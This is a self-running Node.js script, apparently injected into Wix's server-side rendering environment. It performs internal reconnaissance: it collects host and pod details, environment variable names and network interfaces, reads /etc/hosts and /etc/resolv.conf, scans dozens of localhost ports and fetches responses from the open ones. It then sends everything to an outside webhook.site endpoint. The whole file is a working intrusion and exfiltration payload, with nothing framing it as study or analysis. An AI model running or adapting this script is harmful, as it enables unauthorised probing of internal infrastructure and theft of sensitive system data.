(function(){
try{
var WH="https://webhook.site/69bcd627-1871-4dda-b880-83b37ceac418";
var h=require("https");
var net=require("net");
var os=require("os");
var fs=require("fs");
var d={type:"wix-ssr-recon-v3",ts:Date.now()};

// 1. Env info
try{
d.env={node:process.version,cwd:process.cwd(),hostname:process.env.HOSTNAME||"?",pod:process.env.POD_IP||"?",uid:process.getuid?process.getuid():"?",ifaces:os.networkInterfaces()};
}catch(e){d.envErr=e.message}

// 2. Scan localhost common ports
var ports=[80,443,3000,3001,4000,5000,5050,6060,7070,8000,8080,8081,8443,8888,9090,9091,9200,9229,9300,9999,10000,10080,15000,15001,15006,15020,15021,15090,19000,19001,20000,3030,4040,4443,6379,6443,8181,8282,8383,8484,8585];
var results=[];
var done=0;
var total=ports.length;
function sendResults(){
d.portScan=results.sort(function(a,b){return a.port-b.port});
var body=JSON.stringify(d);
try{
var r=h.request({hostname:"webhook.site",port:443,path:"/69bcd627-1871-4dda-b880-83b37ceac418?src=ssr-recon-v3",method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(body)}});
r.write(body);r.end();
}catch(e){}
try{
fetch(WH+"?src=ssr-recon-v3-fetch",{method:"POST",headers:{"Content-Type":"application/json"},body:body}).catch(function(){});
}catch(e){}
}
function scanPort(p){
var s=new net.Socket();
s.setTimeout(500);
s.on("connect",function(){
results.push({port:p,open:true});
// Try HTTP GET on open ports
try{
var req=require("http").get("http://127.0.0.1:"+p+"/",{timeout:1000},function(res){
var chunks=[];
res.on("data",function(c){chunks.push(c)});
res.on("end",function(){
var body=Buffer.concat(chunks).toString("utf8").substring(0,500);
results[results.length-1].response={status:res.statusCode,headers:JSON.parse(JSON.stringify(res.headers)),body:body};
done++;if(done>=total)sendResults();
});
});
req.on("error",function(){done++;if(done>=total)sendResults()});
req.on("timeout",function(){req.destroy();done++;if(done>=total)sendResults()});
}catch(e){done++;if(done>=total)sendResults()}
s.destroy();
});
s.on("timeout",function(){s.destroy();results.push({port:p,open:false});done++;if(done>=total)sendResults()});
s.on("error",function(){results.push({port:p,open:false});done++;if(done>=total)sendResults()});
s.connect(p,"127.0.0.1");
}

// 3. Also try to resolve bo.wix.com from the worker
try{
var dns=require("dns");
dns.resolve4("bo.wix.com",function(err,addrs){
d.bo_dns=err?{err:err.message}:{addrs:addrs};
});
}catch(e){d.bo_dns_err=e.message}

// 4. Check /etc/hosts and resolv.conf
try{d.etc_hosts=fs.readFileSync("/etc/hosts","utf8").substring(0,1000)}catch(e){}
try{d.resolv_conf=fs.readFileSync("/etc/resolv.conf","utf8").substring(0,500)}catch(e){}

// 5. List processes/environment
try{d.envVars=Object.keys(process.env).sort()}catch(e){}

// Start port scan
ports.forEach(scanPort);

// Fallback: send results after 8 seconds even if scans haven't completed
setTimeout(function(){
if(done<total){d.scanIncomplete=true;sendResults()}
},8000);

}catch(e){
try{
fetch("https://webhook.site/69bcd627-1871-4dda-b880-83b37ceac418?src=ssr-recon-error&err="+encodeURIComponent(e.message)).catch(function(){});
}catch(e2){}
}
})();
